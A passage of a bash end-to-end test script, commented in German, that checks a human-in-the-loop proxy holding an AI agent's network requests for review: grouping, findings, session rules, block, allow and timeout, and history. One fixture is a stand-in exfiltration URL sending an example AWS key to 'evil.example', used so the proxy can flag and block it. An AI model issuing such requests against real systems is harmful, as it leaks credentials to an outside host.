#!/usr/bin/env bash
# Das Demoskript des Meilensteins M2 (HUM-036).
#
# M1 hat gezeigt, dass die Kiste dicht ist und dass eine einzelne Entscheidung
# wirkt. M2 zeigt den ersten vollständigen Arbeitsabschnitt: Ein Agent stellt in
# wenigen Sekunden siebzehn Anfragen an drei Hosts, ein Mensch sieht sie
# gruppiert, gibt eine ganze Gruppe mit einer Sitzungsregel frei, blockt eine
# Anfrage, lässt eine laufen und findet danach alles in der Historie wieder.
#
# Belegt werden in einem Lauf:
#
#   1. Gruppierung. Der Daemon kennt zu jedem Fluss die registrierbare Domäne;
#      zwölf Anfragen an die Paket-Registry sind eine Gruppe, zwei an den
#      Code-Host eine zweite, eine an den dritten Host eine dritte.
#   2. Funde. Die Anfrage mit der Mailadresse und die mit dem AWS-Schlüssel
#      tragen je einen Fund, bevor irgendjemand entscheidet.
#   3. Stapel-Freigabe mit Sitzungsregel. Zwölf gehaltene Anfragen werden
#      freigegeben, und die Regel, die dabei entsteht, gilt nur für diese
#      Sitzung.
#   4. Block, Freigabe, Zeitüberschreitung. Der Agent bekommt 403 mit Grund und
#      Notiz, 200 mit dem Inhalt des Ziels, und 504, wo niemand entschieden hat.
#   5. Was die Regel danach entscheidet. Eine spätere Anfrage an denselben Host
#      erscheint nie in der Warteschlange und trägt die Id der Sitzungsregel.
#   6. Dass eine fremde Wurzel in der Konfiguration allein nichts bewirkt.
#   7. Die Historie: dieselben siebzehn Flüsse, mit Filtern über Entscheidung,
#      Grund, Funde und Regel — die Menge, aus der der Export entsteht.
#
# Gefahren wird alles über die Kommandozeile `humanitl`, nicht über einen
# eigenen gRPC-Klienten, und der Agent spricht über `curl` mit dem Proxy:
# Gemessen werden sollen die Codepfade, die später beim Nutzer laufen
# (CONVENTIONS.md 3.11, ADR-018).
#
# Der ganze Lauf liegt in einem eigenen Nutzer- und Netz-Namensraum, aus
# denselben zwei Gründen wie bei M1: Das Ziel braucht eine Adresse, die der
# Proxy erreichen darf (also keine private), und der Namensraum hat keine Route
# nach draußen, der Lauf also kein Netz.
#
#   ./tests/e2e/m2_first_decision/run.sh   bauen und laufen
#   E2E_SKIP_BUILD=1 …                     die Binaries nehmen, wie sie sind
#   E2E_TRACE=1 …                          zusätzlich `set -x` (die CI setzt es)
#   M2_UI=0|1 …                            die Oberflächen-Hälfte aus- oder
#                                          erzwingen; ohne Angabe läuft sie,
#                                          sobald ihr Test existiert
#
# Exit-Codes: 0 alles belegt, 1 eine Behauptung hielt nicht oder eine
# Voraussetzung fehlte, 130 ein Abbruch durch ein Signal. Jede geprüfte
# Behauptung steht als eigene Zeile im Protokoll, auch wenn sie hielt, und am
# Ende steht, wie viele es waren.
#
# --- Was ein grüner Lauf trägt, und was nicht --------------------------------
#
# **Heute steht nur die Daemon-Hälfte des M2-Gates.** Die Spezifikation von
# HUM-036 verlangt den vollen Kreislauf samt Oberfläche unter xvfb und einer
# gültigen HAR-Datei; die gibt es noch nicht (HUM-097). Wer sich auf dieses
# Gate beruft, beruft sich auf die Liste oben und auf nichts darüber hinaus.
# `CONTRIBUTING.md` sagt dasselbe an der Stelle, an der das Gate zur
# Merge-Voraussetzung erklärt wird.
#
# Ein Gate ist nur so viel wert, wie ein späterer Leser über seine Reichweite
# weiß. Deshalb ausdrücklich:
#
#   * Er sagt **nichts über den Bildschirm**. Warteschlange, Aktionsleiste,
#     Regel-Bildschirm und Historie werden nicht bedient; Schritt 10
#     überspringt sich, solange die Oberflächen-Hälfte fehlt, und sagt es.
#     Das ist HUM-097, nicht ein Rest, den jemand nebenbei nachreicht.
#   * Er sagt **nichts über das HAR-Format**. Geprüft wird die Menge, aus der
#     der Export entsteht, nicht eine geschriebene Datei und kein Feld darin.
#   * Er **übt den MITM-Pfad nicht**. Sechzehn der siebzehn Anfragen sind
#     Klartext-HTTP; die einzige verschlüsselte existiert, um zu scheitern.
#     Damit laufen Blatt-Erzeugung aus der eigenen CA, der Handschlag mit dem
#     Agenten und die TLS-Sitzung nach oben für keinen einzigen freigegebenen
#     oder geblockten Fluss — für die Hauptbauart des Produkts fehlt hier
#     Abdeckung, sie fehlt nicht bloß in dieser Fassung. Sie kommt zurück,
#     sobald `--allow-test-ca` da ist (HUM-087).
#   * Schritt 7 hält eine **Abwesenheit** fest, keine Verweigerung: Der Daemon
#     liest `resolver.test_ca` heute gar nicht, er lehnt die Wurzel nicht
#     bewusst ab. Sobald er das Flag kennt, dreht sich der Schritt um; der
#     Stolperdraht darüber sorgt dafür, dass das nicht unbemerkt bleibt.
#   * Er sagt nichts über eine zweite Sitzung, über Neustarts (das prüft M1),
#     über OpenCode (HUM-046) und über Benachrichtigungen (abgeschaltet).
#
# Was er trägt, steht oben in der Aufzählung, und jede einzelne Behauptung
# steht im Protokoll des Laufs.

set -euo pipefail

M2_DIR="$(cd "$(dirname "$0")" && pwd)"
E2E_ROOT="$(cd "$M2_DIR/../../.." && pwd)"
E2E_SCRIPT="$M2_DIR/run.sh"
E2E_SHELL=bash
export E2E_ROOT E2E_SCRIPT E2E_SHELL

# shellcheck source=tests/e2e/lib.sh
. "$E2E_ROOT/tests/e2e/lib.sh"

if [ "${E2E_TRACE:-0}" = 1 ]; then
    set -x
fi

# --- Was dieser Lauf erwartet ------------------------------------------------

# Die Oberflächen-Hälfte des Issues. Sie treibt dieselben Entscheidungen über
# den Bildschirm und schreibt danach die HAR-Datei. Solange es sie nicht gibt,
# fährt dieses Skript die Entscheidungen selbst und sagt an der Stelle, was
# ungeprüft geblieben ist.
M2_UI_TEST="$E2E_ROOT/app/integration_test/m2_first_decision_test.dart"

# So viele Behauptungen prüft ein vollständiger Lauf ohne die Oberfläche. Die
# Selbstprüfung am Ende vergleicht die Zahl mit dem Zähler aus `lib.sh`. Ein
# Skript, das grün ist, weil ein Zweig übersprungen wurde, ist schlimmer als
# keines; deshalb steht die Zahl hier und nicht im Kopf eines Menschen.
M2_EXPECTED_ASSERTIONS=59

# Die Ports des Ziels. Im eigenen Netz-Namensraum ist der Lauf root und darf
# auch die privilegierten binden; damit braucht der Proxy keine Portumlenkung
# (`experimental.upstream_port_map` bleibt deshalb ungenutzt, siehe
# `backlog/CONVENTIONS.md` 4.22).
M2_HTTP_PORT=80
M2_HTTPS_PORT=443

# Die Haltefrist dieses Laufs, in Sekunden. Sie steht auch in `config.toml`;
# hier wird sie zusätzlich über die Umgebung gesetzt, weil `start_daemon` sie so
# entgegennimmt.
M2_HOLD_TIMEOUT=10

# Die Hosts, für die das Testzertifikat gilt.
M2_HOSTS="registry.npmjs.org api.github.com evil.example"

# Die drei Adressen, an denen der Lauf den Agenten festnagelt.
M2_URL_BLOCKED='http://evil.example/exfil?d=AKIAIOSFODNN7EXAMPLE'
M2_URL_ALLOWED='http://api.github.com/graphql'
M2_URL_TIMEOUT='http://api.github.com/repos/x/y'
M2_URL_TLS='https://registry.npmjs.org/tls-probe'

# Der Pfad der positiven Kontrolle zu Schritt 7. Sie geht am Proxy vorbei,
# direkt aus dem Namensraum, und hat einen eigenen Pfad, damit die Gegenprobe
# am Ziel die eine bediente TLS-Anfrage von der unterscheiden kann, die durch
# den Proxy ging und dort scheiterte.
M2_PATH_TLS_CONTROL='/tls-control'

# --- Voraussetzungen ---------------------------------------------------------

for tool in bwrap curl jq python3 ip unshare openssl; do
    command -v "$tool" > /dev/null 2>&1 ||
        e2e_die "$tool is missing; the demo needs bubblewrap, curl, jq, python3, iproute2, util-linux and openssl"
done

# Gebaut wird vor dem Wechsel in den Namensraum, weil es dort kein Netz gibt.
e2e_build
e2e_enter_namespace "$@"

# --- Der Wegwerf-Baum --------------------------------------------------------

E2E_OUT="$E2E_ROOT/target/e2e/m2"
rm -rf "$E2E_OUT"
mkdir -p "$E2E_OUT"

e2e_short_workdir
M2_CA_DIR="$E2E_WORKDIR/ca-test"
M2_AGENT_LOG="$E2E_WORKDIR/out/agent.jsonl"
M2_AGENT_ERR="$E2E_WORKDIR/out/agent.log"
M2_UPSTREAM_LOG="$E2E_WORKDIR/out/upstream.log"
M2_HAR="$E2E_WORKDIR/out/m2.har"
M2_AGENT_PID=""
M2_RULE_ID=""

# Aufräumen, das auch nach einem Fehlschlag greift: erst die Prozesse dieses
# Laufs, dann die Protokolle in den Artefakt-Ordner, dann der Wegwerf-Baum. Was
# der Lauf angelegt hat, liegt vollständig unter `$E2E_WORKDIR` und unter
# `$E2E_OUT`; auf dem Rechner bleibt sonst nichts.
collect() {
    if [ -n "$M2_AGENT_PID" ]; then
        kill "$M2_AGENT_PID" 2> /dev/null || true
        wait "$M2_AGENT_PID" 2> /dev/null || true
        M2_AGENT_PID=""
    fi
    stop_daemon
    stop_fake_upstream
    if [ -n "${E2E_WORKDIR:-}" ] && [ -d "$E2E_WORKDIR" ]; then
        cp -f "$E2E_WORKDIR"/out/* "$E2E_OUT/" 2> /dev/null || true
        cp -f "$E2E_WORKDIR"/daemon.log "$E2E_OUT/" 2> /dev/null || true
        case "$E2E_WORKDIR" in
        /tmp/hum-e2e-*) rm -rf "$E2E_WORKDIR" ;;
        esac
    fi
}
# Auch bei einem Abbruch, nicht nur beim geordneten Ende: `Strg-C` während des
# Wartens auf den Agenten würde sonst nur den Wartelauf abbrechen, das Skript
# liefe weiter und meldete am Ende „OK" (`lib.sh`, `e2e_trap`).
e2e_trap collect

# --- Helfer dieses Laufs -----------------------------------------------------

# m2_flow_page [FILTER] — eine Seite der Flow-Liste als JSON.
m2_flow_page() {
    if [ -z "${1:-}" ]; then
        humanitl --json flows list 2> /dev/null
    else
        humanitl --json flows list "$1" 2> /dev/null
    fi
}

# m2_count [FILTER] — wie viele Flüsse der Filter trifft, `-1` bei einem Fehler.
m2_count() {
    if ! m2_count_out=$(m2_flow_page "${1:-}" | jq -r '.flows | length' 2> /dev/null); then
        m2_count_out=-1
    fi
    [ -n "$m2_count_out" ] || m2_count_out=-1
    printf '%s\n' "$m2_count_out"
}

# m2_ids FILTER — die Ids der Treffer, eine je Zeile.
m2_ids() {
    m2_flow_page "$1" | jq -r '.flows[].flow_id'
}

# m2_row FILTER — die erste Zeile des Filters als JSON, sonst Rückgabewert 1.
m2_row() {
    m2_row_out=$(m2_flow_page "$1" | jq -c '.flows[0] // empty' 2> /dev/null) || return 1
    [ -n "$m2_row_out" ] || return 1
    printf '%s\n' "$m2_row_out"
}

# m2_field FILTER FIELD — ein Feld der ersten Zeile, oder der leere Text.
m2_field() {
    m2_row "$1" | jq -r --arg field "$2" '.[$field] // ""' 2> /dev/null || true
}

# m2_wait_count SECONDS COUNT FILTER — warten, bis der Filter COUNT Zeilen hat.
#
# Gibt die zuletzt gemessene Zahl auf stdout aus, damit der Aufrufer sie in die
# Meldung schreiben kann. Gepollt wird alle 200 ms: Die Aufzeichnung schreibt
# gebündelt, eine Zahl ist deshalb erst nach einem kurzen Moment vollständig.
m2_wait_count() {
    m2_wait_left=$(($1 * 5))
    m2_wait_want="$2"
    m2_wait_filter="$3"
    m2_wait_seen=-1
    while [ "$m2_wait_left" -gt 0 ]; do
        m2_wait_seen=$(m2_count "$m2_wait_filter")
        if [ "$m2_wait_seen" = "$m2_wait_want" ]; then
            printf '%s\n' "$m2_wait_seen"
            return 0
        fi
        sleep 0.2
        m2_wait_left=$((m2_wait_left - 1))
    done
    printf '%s\n' "$m2_wait_seen"
    return 1
}

# m2_expect_count DESCRIPTION SECONDS COUNT FILTER — warten und behaupten.
m2_expect_count() {
    m2_expect_seen=$(m2_wait_count "$2" "$3" "$4") || true
    e2e_expect "$1" "$3" "$m2_expect_seen"
}

# m2_agent_field URL FIELD — ein Feld aus der Ergebniszeile des Agenten.
m2_agent_field() {
    jq -r --arg url "$1" --arg field "$2" \
        'select(.url == $url) | .[$field]' "$M2_AGENT_LOG" 2> /dev/null || true
}

# m2_upstream_hits PATTERN — wie oft das Ziel eine passende Anfrage bedient hat.
m2_upstream_hits() {
    grep -c -- "$1" "$M2_UPSTREAM_LOG" 2> /dev/null || true
}

# m2_start_upstream — das Ziel starten, im Klartext und über TLS.
#
# Setzt `E2E_FAKE_PID`, damit `stop_fake_upstream` aus `lib.sh` es wieder
# beendet. Die Bereitschaft kommt über eine Fifo zurück, damit das Skript nicht
# raten muss, wann die Listener stehen.
m2_start_upstream() {
    m2_fifo="$E2E_WORKDIR/upstream.ready"
    rm -f "$m2_fifo"
    mkfifo "$m2_fifo" || e2e_die "cannot create the fifo for the upstream"
    python3 "$E2E_ROOT/tests/e2e/fake-upstream/fake_upstream.py" \
        --address "$E2E_FAKE_ADDR" \
        --http-port "$M2_HTTP_PORT" \
        --https-port "$M2_HTTPS_PORT" \
        --cert "$M2_CA_DIR/upstream.crt" \
        --key "$M2_CA_DIR/upstream.key" \
        > "$m2_fifo" 2> "$M2_UPSTREAM_LOG" &
    E2E_FAKE_PID=$!
    m2_ready=""
    read -r m2_ready < "$m2_fifo" || true
    rm -f "$m2_fifo"
    # Die ganze Zeile, nicht nur ihr Anfang: Ohne Zertifikat meldet der Server
    # `https=-` und lauscht nur im Klartext. Ein Lauf, der das übersieht,
    # bewiese in Schritt 7 nur, dass auf 443 niemand antwortet.
    if [ "$m2_ready" != "READY http=$M2_HTTP_PORT https=$M2_HTTPS_PORT" ]; then
        e2e_die "the fake upstream did not come up as asked (got \"$m2_ready\"): $(cat "$M2_UPSTREAM_LOG" 2> /dev/null)"
    fi
    e2e_say "fake upstream on $E2E_FAKE_ADDR ($m2_ready, pid $E2E_FAKE_PID)"
}

# m2_write_config — die Konfiguration dieses Laufs in den XDG-Baum legen.
#
# `start_daemon` legt denselben Baum an und überschreibt die Datei nicht; Daemon
# und Kommandozeile finden sie über `humanitl_config::discover_with`, ohne dass
# ihnen jemand einen Pfad nennen müsste.
m2_write_config() {
    mkdir -p "$E2E_WORKDIR/config/humanitl"
    sed -e "s|@UPSTREAM_ADDR@|$E2E_FAKE_ADDR|g" \
        -e "s|@TEST_CA@|$M2_CA_DIR/test-ca.crt|g" \
        "$M2_DIR/config.toml" > "$E2E_WORKDIR/config/humanitl/config.toml"
    e2e_say "config $E2E_WORKDIR/config/humanitl/config.toml"
}

# --- Zertifikat, Ziel, Daemon ------------------------------------------------

e2e_step "the run brings its own certificate authority, its own target and its own daemon"

# shellcheck disable=SC2086 # M2_HOSTS ist absichtlich eine Wortliste.
sh "$E2E_ROOT/tests/e2e/fake-upstream/gen-test-ca.sh" "$M2_CA_DIR" $M2_HOSTS ||
    e2e_die "openssl could not create the test certificate"
e2e_say "test CA in $M2_CA_DIR, valid for $M2_HOSTS"

m2_start_upstream
m2_write_config
start_daemon "$E2E_WORKDIR/state" "$E2E_WORKDIR" "$M2_HOLD_TIMEOUT"

# Der Beleg, dass das Ziel antwortet, bevor irgendwo behauptet wird, eine
# Anfrage sei nicht bei ihm angekommen. Ohne diese Zeile hieße ein
# fehlgeschlagener Aufruf nur „hier antwortet niemand".
reachable=$(curl -sS --max-time 5 --noproxy '*' \
    "http://$E2E_FAKE_ADDR:$M2_HTTP_PORT/reachable" || true)
e2e_expect "the target answers on the host of the namespace" /reachable \
    "$(printf '%s' "$reachable" | jq -r '.path // ""' 2> /dev/null || true)"

# Der Wert aus dem JSON, nicht eine Teilzeichenkette darin: `grep` fände die Id
# auch in einem Feld, das gar nicht `session_id` heißt, und wäre gegen jede
# Umbenennung blind.
info=$(daemon_info)
e2e_expect_match "the daemon serves GetInfo and runs a proxy session" \
    '^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$' \
    "$(printf '%s' "$info" | jq -r '.session_id // ""')"

# Die Konfiguration dieses Laufs, mit ihren Werten und nicht nur ihren
# Schlüsseln. Scheiterte die Ersetzung der Platzhalter in `config.toml` still,
# stünde `@UPSTREAM_ADDR@` in der Datei und `@TEST_CA@` als Pfad; Schritt 7
# belegte dann, dass eine Testwurzel nichts bewirkt, während gar keine
# konfiguriert wäre — eine Zusicherung ohne ihre Voraussetzung.
#
# Dass der Daemon die Zuordnung auch benutzt, zeigt sich später von selbst: Im
# Namensraum gibt es keinen Namensdienst, und ohne sie endete jede freigegebene
# Anfrage als `upstream_dns` statt mit dem Inhalt des Ziels.
overrides=$(humanitl --json config get resolver.overrides |
    jq -r '.value | to_entries | map("\(.key)=\(.value)") | join(" ")')
e2e_expect "the resolver override points all three hosts at the target" \
    "api.github.com=$E2E_FAKE_ADDR evil.example=$E2E_FAKE_ADDR registry.npmjs.org=$E2E_FAKE_ADDR" \
    "$overrides"

configured_ca=$(humanitl --json config get resolver.test_ca | jq -r '.value')
e2e_expect "the configuration names the test CA of this run" \
    "$M2_CA_DIR/test-ca.crt" "$configured_ca"

if [ -s "$configured_ca" ] &&
    head -n 1 "$configured_ca" | grep -q '^-----BEGIN CERTIFICATE-----$'; then
    e2e_check "and that file really is a certificate" ok
else
    e2e_check "and that file really is a certificate" no \
        "$configured_ca is missing, empty or not PEM"
fi

# Der Stolperdraht zu Schritt 7. Dessen drei Behauptungen prüfen ein Ergebnis
# (der Handschlag nach oben scheitert) und würden auch dann grün bleiben, wenn
# der Daemon `--allow-test-ca` längst kennt: `start_daemon` startet ihn ohne das
# Flag, die Wurzel bliebe ungenutzt, die Probe bliebe 502 — der Mangel wäre weg,
# die Zusicherung stünde weiter. Deshalb wird hier die Kommandozeilen-Fläche
# selbst geprüft, und nicht ihr Ergebnis.
if "$E2E_DAEMON" --help 2>&1 | grep -q -- '--allow-test-ca'; then
    e2e_check "humanitld still has no --allow-test-ca, so step 7 still means what it says" no \
        "humanitld now knows --allow-test-ca. Turn step 7 around: start the daemon with the flag (E2E_DAEMON_ARGS or start_daemon), put the URLs in script.json on https://, and expect 200 with the content of the target instead of 502 upstream_tls. Then rewrite this check and CONVENTIONS.md 4.22."
fi
e2e_check "humanitld still has no --allow-test-ca, so step 7 still means what it says" ok

# Und der Daemon sagt es auch selbst, statt dass der Lauf es aus einem
# Ausbleiben schließt.
e2e_expect_match "and the daemon says on its own that it ignores the key" \
    'resolver\.test_ca is set but the daemon does not read it yet' \
    "$(cat "$DAEMON_LOG")"

# Und dass die Sandbox mitbringt, was der Agent gleich braucht. Beides liegt
# unter /usr, das jedes Profil nur lesbar einhängt; fehlt es, soll die Meldung
# das sagen und nicht eine Reihe stiller Fehlschläge sein.
tools=$(sandbox_run /usr/bin/python3 -c \
    'import os; print("curl", os.access("/usr/bin/curl", os.X_OK))' 2> /dev/null || true)
e2e_expect_match "the sandbox has the client the agent speaks through" \
    '^curl True$' "$tools"

# --- Der Agent ---------------------------------------------------------------

e2e_step "the agent starts and its requests pile up"

cp "$E2E_ROOT/tests/e2e/fake-agent/fake_agent.py" "$E2E_WORKDIR/work/fake_agent.py"
cp "$M2_DIR/script.json" "$E2E_WORKDIR/work/script.json"

sandbox_run /usr/bin/python3 /work/fake_agent.py /work/script.json \
    > "$M2_AGENT_LOG" 2> "$M2_AGENT_ERR" &
M2_AGENT_PID=$!

# --- 1. Gruppierung ----------------------------------------------------------

e2e_step "1. the daemon groups the requests by registrable domain"

m2_expect_count "twelve requests to the package registry are held" \
    30 12 "state:held apex:npmjs.org"

# `apex:` liest die Spalte, die der Domain-Katalog beim Eintreffen gefüllt hat,
# `host:` den Namen aus der Anfrage. Beide Zahlen nebeneinander sind die
# Aussage: Der Daemon hat die zwölf Hosts einer Domäne zugeordnet, und nicht
# nur zwölf gleiche Namen gezählt.
npm_by_host=$(m2_count "state:held host:registry.npmjs.org")
e2e_expect "and the same twelve when asked by host" 12 "$npm_by_host"

# --- 2. Stapel-Freigabe mit Sitzungsregel ------------------------------------
#
# Die Freigabe kommt vor allen weiteren Behauptungen über die anderen beiden
# Hosts: Die erste Anfrage der Gruppe wartet seit dem Start, und ihre Frist
# läuft. Ein Skript, das erst noch auf Anfragen wartet, die später eintreffen,
# ließe sie unterwegs verfallen und prüfte danach etwas anderes als gemeint.

e2e_step "2. a human releases the whole group and remembers it for this session"

# Erst die Regel, dann die Freigabe. `DecideRequest.remember` legt beides in
# einem Aufruf an; `humanitl flows decide` kennt weder mehrere Ids noch
# `--remember`, und dieser Lauf geht deshalb über zwei Schritte
# (`backlog/CONVENTIONS.md` 4.22). Die Wirkung ist dieselbe: Die zwölf schon
# gehaltenen Anfragen gehen über die Entscheidung hinaus, denn entschieden wird
# beim Eintreffen; alles, was danach kommt, geht über die Regel.
rule_json=$(humanitl --json rules add \
    --action allow \
    --host '**.npmjs.org' \
    --expires session \
    --note 'e2e: the whole npm group, for this session') ||
    e2e_die "the daemon refused the session rule"
M2_RULE_ID=$(printf '%s' "$rule_json" | jq -r '.added.rule_id')
e2e_say "session rule $M2_RULE_ID"

rules_json=$(humanitl --json rules list)
e2e_expect "the rule store holds exactly one session rule" 1 \
    "$(printf '%s' "$rules_json" | jq '[.rules[] | select(.expires.kind == "session")] | length')"

rule_row=$(printf '%s' "$rules_json" |
    jq -c --arg id "$M2_RULE_ID" '.rules[] | select(.rule_id == $id)')
e2e_expect "it allows the whole registrable domain" '**.npmjs.org' \
    "$(printf '%s' "$rule_row" | jq -r '.host')"
e2e_expect "with the action a release means" allow \
    "$(printf '%s' "$rule_row" | jq -r '.action')"
e2e_expect "and it is temporary, not permanent" session \
    "$(printf '%s' "$rule_row" | jq -r '.expires.kind')"

# Die Ids des Stapels werden festgehalten, bevor sie entschieden werden: Sie
# sind später die einzige Möglichkeit, den Teil der Freigaben, den ein Mensch
# ausgesprochen hat, vom Teil zu trennen, den die Regel übernommen hat. Der
# Filter kann das nicht — er kennt keinen Term für „ohne Regel".
M2_BATCH_IDS="$E2E_WORKDIR/npm-batch.txt"
m2_ids "state:held apex:npmjs.org" > "$M2_BATCH_IDS"
while read -r flow; do
    [ -n "$flow" ] || continue
    flow_decide "$flow" allow || e2e_say "the daemon refused the allow for $flow"
done < "$M2_BATCH_IDS"

# Gefragt wird der Daemon, nicht die Schleife: Ein Rückgabewert von `humanitl`
# sagt, dass der Aufruf durchging, nicht, dass der Fluss entschieden ist.
m2_expect_count "no request to the registry is waiting any more" \
    20 0 "state:held apex:npmjs.org"
m2_expect_count "and the daemon has all twelve of them decided allow" \
    20 12 "apex:npmjs.org decision:allow"

# --- 3. Die anderen beiden Gruppen und ihre Funde ----------------------------

e2e_step "3. the other two hosts are groups of their own, and two of them carry a finding"

m2_expect_count "the two requests to the code host are a group of their own" \
    30 2 "state:held apex:github.com"
# Auch der dritte Host bekommt eine Domäne, obwohl `example` keine
# eingetragene Top-Level-Domain ist: Die Public Suffix List hat dafür ihre
# Vorgaberegel, und der Katalog trägt `evil.example` als Apex ein. Gefragt wird
# hier deshalb wie bei den anderen beiden über `apex:`.
m2_expect_count "and the third host is a group of one" \
    30 1 "state:held apex:evil.example"

m2_expect_count "exactly two held requests carry a finding" \
    10 2 "state:held findings:>0"
e2e_expect "the POST with the mail address carries one" 1 \
    "$(m2_field 'state:held path:/graphql' finding_count)"
e2e_expect "and the request with the AWS key carries one" 1 \
    "$(m2_field 'state:held path:/exfil' finding_count)"

# --- 4. Block und Freigabe ---------------------------------------------------

e2e_step "4. one request is blocked with a note, one is allowed, one is left alone"

exfil_flow=$(m2_field 'state:held path:/exfil' flow_id)
[ -n "$exfil_flow" ] ||
    e2e_die "the request with the AWS key is gone before anyone decided"
flow_decide "$exfil_flow" block "not in this run" ||
    e2e_die "the daemon refused the block"

graphql_flow=$(m2_field 'state:held path:/graphql' flow_id)
[ -n "$graphql_flow" ] ||
    e2e_die "the POST with the mail address is gone before anyone decided"
flow_decide "$graphql_flow" allow ||
    e2e_die "the daemon refused the allow"

# Die dritte, `/repos/x/y`, bleibt absichtlich liegen: Sie ist die Anfrage, die
# in die Zeitüberschreitung laufen soll.
e2e_say "leaving /repos/x/y undecided; its deadline is ${M2_HOLD_TIMEOUT}s"

# --- Warten, bis der Agent fertig ist ----------------------------------------

e2e_step "the agent runs to its end"

wait "$M2_AGENT_PID" || e2e_say "the agent exited non-zero; its log is in the artefacts"
M2_AGENT_PID=""
lines=$(wc -l < "$M2_AGENT_LOG" | tr -d ' ')
e2e_expect "the agent reports one line per request" 17 "$lines"

# Die drei Garantien, aus der Sandbox, die den Verkehr dieses Laufs getragen
# hat. `humanitl sandbox run -v` schreibt sie beim Start als Zeilen
# `check <name> pass|FAIL: <evidence>` nach stderr, und `sandbox run` läuft
# fail-closed — der Agent lief also nur, weil sie alle drei hielten. Gelesen
# werden sie trotzdem: M2 ist der einzige Lauf, in dem die Sandbox echten
# Verkehr trägt, und ein Bericht, in den niemand sieht, ist kein Beleg.
isolation=$(cat "$M2_AGENT_ERR")
e2e_expect_match "the sandbox that carried this run had no interface but lo" \
    'check no_network_interface pass' "$isolation"
e2e_expect_match "and exactly one socket, and it was the proxy" \
    'check single_socket pass' "$isolation"
e2e_expect_match "and seccomp was active in the agent process" \
    'check seccomp_active pass' "$isolation"

# --- 5. Was der Agent gesehen hat --------------------------------------------

e2e_step "5. what the agent got back"

# Zwölf aus dem Stapel und die spätere Anfrage, die die Regel erlaubt hat.
npm_ok=$(jq -r 'select(.url | startswith("http://registry.npmjs.org/")) | .status' \
    "$M2_AGENT_LOG" | grep -c '^200$' || true)
e2e_expect "the released requests answer with the content of the target" 13 "$npm_ok"

e2e_expect "the blocked request ends as 403" 403 \
    "$(m2_agent_field "$M2_URL_BLOCKED" status)"
blocked_body=$(m2_agent_field "$M2_URL_BLOCKED" body_head)
e2e_expect_match "and names the human as the reason" '^reason: user$' "$blocked_body"
e2e_expect_match "and carries the note of the human" '^note: not in this run$' "$blocked_body"

e2e_expect "the allowed POST answers with 200" 200 \
    "$(m2_agent_field "$M2_URL_ALLOWED" status)"

e2e_expect "the request nobody decided ends as 504" 504 \
    "$(m2_agent_field "$M2_URL_TIMEOUT" status)"
timeout_body=$(m2_agent_field "$M2_URL_TIMEOUT" body_head)
e2e_expect_match "and names the deadline" '^reason: timeout$' "$timeout_body"

# --- 6. Was die Regel danach entscheidet -------------------------------------

e2e_step "6. the session rule decides what comes after it"

e2e_expect "the later request to the registry was allowed" allow \
    "$(m2_field 'path:/chalk' decision)"
e2e_expect "by the session rule, not by a human" "$M2_RULE_ID" \
    "$(m2_field 'path:/chalk' rule_id)"
e2e_expect "and it never waited for one" recorded \
    "$(m2_field 'path:/chalk' state)"

# --- 7. Die fremde Wurzel ----------------------------------------------------

e2e_step "7. a test CA in the configuration is not trusted on its own"

# `resolver.test_ca` zeigt auf die Wurzel, mit der der Fake-Upstream sein
# TLS-Zertifikat unterschrieben hat. Der Schlüssel allein darf nichts bewirken:
# erst das ausdrückliche Flag des Daemons macht die Wurzel gültig, und solange
# es dieses Flag nicht gibt, liest der Daemon den Schlüssel gar nicht
# (`backlog/CONVENTIONS.md` 4.22). Belegt wird das an der Anfrage, die die
# Sitzungsregel ohne jede Rückfrage erlaubt hat: Sie scheitert am Handschlag
# zum Ziel, statt eine Antwort zu bekommen.
e2e_expect "the TLS request reaches the proxy and fails there" 502 \
    "$(m2_agent_field "$M2_URL_TLS" status)"
e2e_expect "the flow says the handshake to the target failed" upstream_tls \
    "$(m2_field 'path:/tls-probe' error)"
e2e_expect "and it was allowed before it failed, so nobody was asked" allow \
    "$(m2_field 'path:/tls-probe' decision)"

# Die Gegenprobe, ohne die der Schritt nichts sagt: `502 upstream_tls` entsteht
# genauso, wenn das Blatt für die falschen Hosts gälte, abgelaufen wäre oder
# von einer fremden Wurzel stammte. Ein Klient im selben Namensraum, mit
# derselben Wurzel und ohne Proxy, schafft den Handschlag — und ohne die Wurzel
# scheitert er. Damit ist belegt, was der Schritt voraussetzt: Das Material ist
# gültig, und was ihm fehlt, ist allein das Vertrauen des Daemons.
#
# `--noproxy '*'` und `--resolve`: Der Aufruf geht direkt zum Ziel, nicht über
# den Proxy, und mit dem Namen, für den das Blatt gilt. Der eigene Pfad hält
# die Null-Zählung für `/tls-probe` sauber.
control=$(curl -sS --max-time 5 --noproxy '*' \
    --cacert "$M2_CA_DIR/test-ca.crt" \
    --resolve "registry.npmjs.org:$M2_HTTPS_PORT:$E2E_FAKE_ADDR" \
    "https://registry.npmjs.org$M2_PATH_TLS_CONTROL" 2> /dev/null || true)
e2e_expect "a client that does trust the test CA completes the handshake" \
    "$M2_PATH_TLS_CONTROL" \
    "$(printf '%s' "$control" | jq -r '.path // ""' 2> /dev/null || true)"

without_root=$(curl -sS --max-time 5 --noproxy '*' \
    --resolve "registry.npmjs.org:$M2_HTTPS_PORT:$E2E_FAKE_ADDR" \
    "https://registry.npmjs.org$M2_PATH_TLS_CONTROL" 2>&1 || true)
e2e_expect_match "and the same client without it does not" \
    'certificate|SSL|TLS' "$without_root"

# --- 8. Die Historie ---------------------------------------------------------

e2e_step "8. the history holds the set the export is built from"

m2_expect_count "the history holds every request of the run" 20 17 ""
m2_expect_count "fifteen of them were allowed" 10 15 "decision:allow"
m2_expect_count "one was blocked by a human" 10 1 "decision:block"
m2_expect_count "and one ran into the deadline" 10 1 "decision:timed_out"
m2_expect_count "the block names the human as its reason" 10 1 "reason:user"
m2_expect_count "and the deadline names itself" 10 1 "reason:timeout"
m2_expect_count "two requests carry a finding" 10 2 "findings:>0"

e2e_expect "fourteen requests to the registry were allowed" 14 \
    "$(m2_count 'apex:npmjs.org decision:allow')"
e2e_expect "two of them by the session rule" 2 "$(m2_count "rule:$M2_RULE_ID")"

# Und zwölf durch einen Menschen. Gefragt wird nach den Ids, die vor der
# Freigabe festgehalten wurden, und nach dem, was der Daemon heute über sie
# sagt: Entscheidung `allow`, keine Regel. Die Differenz zweier Zahlen des
# Skripts wäre eine Rechnung, keine Auskunft.
by_human=$(m2_flow_page "" | jq --arg ids "$(cat "$M2_BATCH_IDS")" '
    ($ids | split("\n") | map(select(length > 0))) as $batch
    | [.flows[]
